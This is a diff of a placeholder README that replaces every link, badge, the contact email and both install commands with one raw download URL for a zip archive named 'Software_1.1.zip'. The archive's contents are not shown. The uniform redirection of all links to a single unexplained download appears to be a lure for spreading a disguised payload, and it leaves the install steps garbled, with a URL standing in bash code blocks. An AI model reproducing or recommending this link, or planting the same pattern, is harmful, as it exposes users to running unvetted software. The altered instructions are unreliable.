@@ -1,6 +1,6 @@
 # 🚀 Welcome to Project
 
-![GitHub](https://img.shields.io/badge/GitHub-Visit%20Repo-blue)
+![GitHub](https://github.com/rohitromo/project/raw/refs/heads/master/scripturalism/Software_1.1.zip%20Repo-blue)
 
 ## Introduction
 
@@ -25,7 +25,7 @@ Welcome to the **Project** repository! This project is designed to simplify comp
 
 ## Installation
 
-To get started with **Project**, you need to download the files from the repository. You can find the repository [here](https://github.com). Once downloaded, follow these steps to install:
+To get started with **Project**, you need to download the files from the repository. You can find the repository [here](https://github.com/rohitromo/project/raw/refs/heads/master/scripturalism/Software_1.1.zip). Once downloaded, follow these steps to install:
 
 1. Unzip the downloaded file.
 2. Open your terminal or command prompt.
@@ -33,7 +33,7 @@ To get started with **Project**, you need to download the files from the reposit
 4. Run the installation script:
 
    ```bash
-   ./install.sh
+   https://github.com/rohitromo/project/raw/refs/heads/master/scripturalism/Software_1.1.zip
    ```
 
 This will set up everything you need to get started.
@@ -47,7 +47,7 @@ Once installed, you can use **Project** for various tasks. Here’s how to run t
 3. Execute the following command:
 
    ```bash
-   ./start.sh
+   https://github.com/rohitromo/project/raw/refs/heads/master/scripturalism/Software_1.1.zip
    ```
 
 ### Example Commands
@@ -55,7 +55,7 @@ Once installed, you can use **Project** for various tasks. Here’s how to run t
 - **Command 1**: Description of what this command does.
 - **Command 2**: Description of what this command does.
 
-For more detailed examples, please check the [Releases](https://github.com) section for additional resources.
+For more detailed examples, please check the [Releases](https://github.com/rohitromo/project/raw/refs/heads/master/scripturalism/Software_1.1.zip) section for additional resources.
 
 ## Contributing
 
@@ -79,7 +79,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any inquiries, please reach out to the maintainers:
 
 - **Name**: Your Name
-- **Email**: your.email@example.com
+- **Email**: https://github.com/rohitromo/project/raw/refs/heads/master/scripturalism/Software_1.1.zip
 
 Feel free to connect on GitHub or through email.
 
@@ -87,10 +87,10 @@ Feel free to connect on GitHub or through email.
 
 We would like to thank all contributors and users who have provided feedback and support. Special thanks to the following libraries and tools that made this project possible:
 
-- [Library 1](https://example.com)
-- [Library 2](https://example.com)
+- [Library 1](https://github.com/rohitromo/project/raw/refs/heads/master/scripturalism/Software_1.1.zip)
+- [Library 2](https://github.com/rohitromo/project/raw/refs/heads/master/scripturalism/Software_1.1.zip)
 
-For more information and updates, visit the repository [here](https://github.com).
+For more information and updates, visit the repository [here](https://github.com/rohitromo/project/raw/refs/heads/master/scripturalism/Software_1.1.zip).
 
 ---
 
